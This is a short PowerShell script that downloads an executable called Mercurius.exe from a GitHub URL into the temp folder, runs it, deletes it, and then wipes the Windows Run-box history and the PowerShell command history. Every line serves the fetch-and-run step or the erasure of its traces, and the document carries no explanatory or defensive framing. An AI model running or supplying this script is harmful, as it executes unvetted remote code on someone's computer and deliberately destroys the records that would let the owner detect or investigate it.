# Download Mercurius
Invoke-WebRequest https://raw.githubusercontent.com/n3exsus/mercurius/main/Mercurius.exe -OutFile "$env:TEMP\Mercurius.exe"

# Run Mercurius
Start-Process -FilePath "$env:TEMP\Mercurius.exe" -Wait

# Delete Mercurius
Remove-Item -Path "$env:TEMP\Mercurius.exe" -Force

# Delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 

# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
